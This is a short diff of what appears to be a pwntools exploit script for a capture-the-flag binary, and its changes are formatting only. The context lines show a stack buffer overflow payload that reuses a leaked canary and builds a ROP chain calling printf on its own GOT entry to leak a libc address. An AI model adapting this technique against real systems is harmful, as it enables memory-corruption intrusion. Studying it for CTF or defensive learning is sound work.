@@ -17,10 +17,10 @@ io = process([vuln_path]) if not f_remote else remote("", 9999)
 
 
 def ddebug(b=""):
-    if not f_gdb: return
+    if not f_gdb:
+        return
     gdb.attach(io, gdbscript=b)
     pause()
-
 
 
 io.sendlineafter("ch: ", "1")
@@ -52,8 +52,8 @@ payload = b"a"*40 + p64(canary)
 payload += p64(0)
 payload += p64(ret)
 payload += p64(pop_rdi)
-payload += p64(printf_got) 
-payload += p64(printf_plt) 
+payload += p64(printf_got)
+payload += p64(printf_plt)
 payload += p64(ret)
 payload += p64(main)
 
